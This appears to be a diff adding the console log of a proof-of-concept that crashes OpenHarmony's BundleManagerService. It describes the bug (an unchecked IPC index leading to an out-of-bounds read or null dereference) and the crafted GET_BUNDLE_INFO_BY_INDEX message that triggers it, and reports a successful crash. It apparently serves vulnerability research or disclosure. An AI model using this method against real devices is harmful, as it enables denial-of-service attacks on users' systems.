@@ -1,0 +1,11 @@
+=== PoC: BMS HandleGetBundleInfosByIndex OOB/Nullptr Crash ===
+Target: OpenHarmony bundle_framework_lite BundleManagerService
+Bug:    Unchecked index from IPC leads to OOB read or nullptr deref
+
+[+] Connected to BMS service
+
+--- Strategy 1: Null pointer dereference ---
+[PoC] Sending crafted GET_BUNDLE_INFO_BY_INDEX with invalid codeFlag...
+[PoC] Expected: BMS crashes due to nullptr + 0x41414141 * sizeof(BundleInfo)
+[PoC] Invoke returned -1 (service likely crashed)
+[+] Service crashed! PoC successful.
